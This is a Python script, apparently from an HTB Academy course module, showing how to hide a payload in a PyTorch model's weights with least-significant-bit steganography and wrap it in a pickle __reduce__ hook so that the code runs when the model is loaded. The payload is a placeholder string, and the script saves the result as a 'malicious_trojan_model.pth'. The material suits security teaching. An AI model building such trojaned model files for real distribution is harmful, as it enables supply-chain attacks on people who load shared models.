# Used in HTB Academy pickles and steg AI module - AI Data Attacks

import os
import struct
import torch


# ==========================================
# 1. LSB Steganography Functions
# ==========================================

def encode_lsb(
    tensor_orig: torch.Tensor,
    data_bytes: bytes,
    num_lsb: int,
) -> torch.Tensor:
    """Encode bytes into a float32 tensor's least significant bits.

    Prepends the payload length as a 4-byte unsigned big-endian integer.
    """
    if tensor_orig.dtype != torch.float32:
        raise TypeError("Tensor must be float32.")

    if not 1 <= num_lsb <= 8:
        raise ValueError("num_lsb must be 1–8. More bits increase distortion.")

    tensor = tensor_orig.detach().clone().contiguous()
    tensor_flat = tensor.view(-1)
    n_elements = tensor.numel()

    # Prepend the payload length as a 4-byte unsigned integer.
    data_to_embed = struct.pack(">I", len(data_bytes)) + data_bytes

    total_bits_needed = len(data_to_embed) * 8
    capacity_bits = n_elements * num_lsb

    if total_bits_needed > capacity_bits:
        required_elements = (total_bits_needed + num_lsb - 1) // num_lsb
        raise ValueError(
            f"Tensor too small: needs {total_bits_needed} bits, "
            f"but capacity is {capacity_bits} bits. "
            f"Required elements: {required_elements}, "
            f"available: {n_elements}."
        )

    data_iter = iter(data_to_embed)
    current_byte = next(data_iter, None)
    bit_index_in_byte = 7
    element_index = 0
    bits_embedded = 0
    mask = (1 << num_lsb) - 1

    while bits_embedded < total_bits_needed:
        original_float = tensor_flat[element_index].item()
        packed_float = struct.pack(">f", original_float)
        int_representation = struct.unpack(">I", packed_float)[0]

        data_bits_for_float = 0

        for i in range(num_lsb):
            if current_byte is None:
                break

            data_bit = (current_byte >> bit_index_in_byte) & 1
            data_bits_for_float |= data_bit << (num_lsb - 1 - i)

            bit_index_in_byte -= 1
            bits_embedded += 1

            if bit_index_in_byte < 0:
                current_byte = next(data_iter, None)
                bit_index_in_byte = 7

            if bits_embedded >= total_bits_needed:
                break

        # Replace the selected LSBs with the payload bits.
        cleared_int = int_representation & ~mask
        new_int_representation = cleared_int | data_bits_for_float

        new_packed_float = struct.pack(">I", new_int_representation)
        new_float = struct.unpack(">f", new_packed_float)[0]

        tensor_flat[element_index] = new_float
        element_index += 1

    print(
        f"[*] Encoded {bits_embedded} bits into {element_index} elements "
        f"using {num_lsb} LSB(s) per element."
    )

    return tensor


def decode_lsb(
    tensor_modified: torch.Tensor,
    num_lsb: int,
) -> bytes:
    """Decode bytes hidden in a float32 tensor's least significant bits."""
    if tensor_modified.dtype != torch.float32:
        raise TypeError("Tensor must be float32.")

    if not 1 <= num_lsb <= 8:
        raise ValueError("num_lsb must be 1–8.")

    tensor_flat = tensor_modified.flatten()
    n_elements = tensor_flat.numel()
    capacity_bits = n_elements * num_lsb
    mask = (1 << num_lsb) - 1

    element_index = 0
    bits_read = 0
    bits_remaining = 0
    lsb_data = 0

    def get_bits(count: int) -> list[int]:
        nonlocal element_index, bits_read, bits_remaining, lsb_data

        available_bits = capacity_bits - bits_read
        if count > available_bits:
            raise ValueError(
                f"Insufficient tensor capacity: requested {count} bits, "
                f"but only {available_bits} bits remain."
            )

        bits = []
        for _ in range(count):
            if bits_remaining == 0:
                current_float = tensor_flat[element_index].item()
                packed_float = struct.pack(">f", current_float)
                int_representation = struct.unpack(">I", packed_float)[0]

                lsb_data = int_representation & mask
                bits_remaining = num_lsb
                element_index += 1

            bits_remaining -= 1
            bit = (lsb_data >> bits_remaining) & 1
            bits.append(bit)
            bits_read += 1

        return bits

    length_bits = get_bits(32)
    payload_len_bytes = 0
    for bit in length_bits:
        payload_len_bytes = (payload_len_bytes << 1) | bit

    payload_bits_needed = payload_len_bytes * 8
    available_bits = capacity_bits - bits_read

    if payload_bits_needed > available_bits:
        raise ValueError(
            f"Failed to decode payload (length: {payload_len_bytes} bytes): "
            f"needs {payload_bits_needed} bits, but only {available_bits} remain."
        )

    decoded_bytes = bytearray()
    for _ in range(payload_len_bytes):
        byte_value = 0
        for bit in get_bits(8):
            byte_value = (byte_value << 1) | bit
        decoded_bytes.append(byte_value)

    return bytes(decoded_bytes)


# ==========================================
# 2. Trojan Wrapper Definition
# ==========================================

class TrojanModelWrapper:
    """Wrapper class that executes custom logic upon unpickling."""
    def __init__(self, modified_state_dict: dict, target_key: str, num_lsb: int):
        self.num_lsb = num_lsb
        self.target_key = target_key
        
        target_tensor = modified_state_dict[target_key]
        self.extracted_payload = decode_lsb(target_tensor, num_lsb)
        self.state_dict = modified_state_dict

    def __reduce__(self):
        return (_unpickle_trojan, (self.state_dict, self.target_key, self.num_lsb))


def _unpickle_trojan(state_dict, target_key, num_lsb):
    """Callback triggered automatically when the object is unpickled."""
    print("[!] Triggered unpickle execution flow!")
    return TrojanModelWrapper(state_dict, target_key, num_lsb)


# ==========================================
# 3. Main Execution Workflow
# ==========================================

if __name__ == "__main__":
    NUM_LSB = 2
    target_key = "large_layer.weight"

    print("--- 1. Loading original model state dict ---")
    model_path = "target_model.pth"
    if os.path.exists(model_path):
        modified_state_dict = torch.load(model_path)
    else:
        raise FileNotFoundError(f"Could not find {model_path}. Make sure it's in the current directory.")

    original_tensor = modified_state_dict[target_key].float()

    print("\n--- 2. Embedding payload using LSB steganography ---")
    secret_payload = b"MALICIOUS_PAYLOAD_COMMAND_EXECUTION"
    
    encoded_tensor = encode_lsb(original_tensor, secret_payload, NUM_LSB)
    modified_state_dict[target_key] = encoded_tensor

    print(f"\n--- 3. Instantiating TrojanModelWrapper ---")
    try:
        wrapper_instance = TrojanModelWrapper(
            modified_state_dict=modified_state_dict,
            target_key=target_key,
            num_lsb=NUM_LSB,
        )
        print("[*] TrojanModelWrapper instance created successfully.")
        print(f"[*] Successfully extracted embedded payload from tensor: {wrapper_instance.extracted_payload}")
    except Exception as e:
        print(f"\n--- Error Instantiating Wrapper ---")
        print(f"Error: {e}")
        raise SystemExit("Failed to instantiate TrojanModelWrapper.") from e

    final_malicious_file = "malicious_trojan_model.pth"
    print(f"\n--- 4. Saving the Trojan Wrapper Instance to '{final_malicious_file}' ---")
    
    try:
        torch.save(wrapper_instance, final_malicious_file)
        print(f"[*] Final malicious Trojan file saved successfully to '{final_malicious_file}'.")
        print(f"[*] File size: {os.path.getsize(final_malicious_file)} bytes.")
    except Exception as e:
        print(f"\n--- Error Saving Final Malicious File ---")
        import traceback
        traceback.print_exc()
        raise SystemExit("Failed to save the final malicious wrapper file.") from e
